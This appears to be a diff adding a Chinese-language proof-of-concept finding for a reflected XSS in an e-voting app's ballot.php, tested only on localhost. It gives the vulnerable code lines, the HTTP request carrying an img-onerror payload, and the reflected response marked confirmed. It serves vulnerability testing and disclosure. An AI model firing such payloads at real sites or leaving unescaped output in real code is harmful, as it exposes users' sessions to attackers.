@@ -1,0 +1,20 @@
+F9 POC: Secured E-Voting System ballot.php election_id 反射型 XSS
+时间: 2026-11-09  目标: http://127.0.0.1:8138 (仅本地)
+
+== 漏洞要点 ==
+ballot.php:18 $election_id = $_GET['id'] ?? $election_id;（GET 完全控制）
+ballot.php:141 <span class="font-bold">#<?php echo $election_id; ?></span> 无转义输出。
+需登录（ballot.php:6），故为已认证用户反射 XSS；URL 可经钓鱼链接触发。
+
+== 请求 ==
+GET /election/ballot?id=78880159"><img src=x onerror=alert(document.domain)> HTTP/1.1
+Host: 127.0.0.1:8138
+Cookie: PHPSESSID=<已登录会话>
+
+== 响应证据 ==
+HTTP 200，响应体内原样包含 payload：True
+
+响应 HTML 片段（ELECTION ID 处）：
+ELECTION ID: <span class="font-bold">#78880159"><img src=x onerror=alert(document.domain)></span></div>             <div><i class="fas fa-clock mr-1"></i> EXPIRES: <span class="font-bold">Aug 31, 202
+payload: 78880159"><img src=x onerror=alert(document.domain)>
+VERDICT: XSS-CONFIRMED
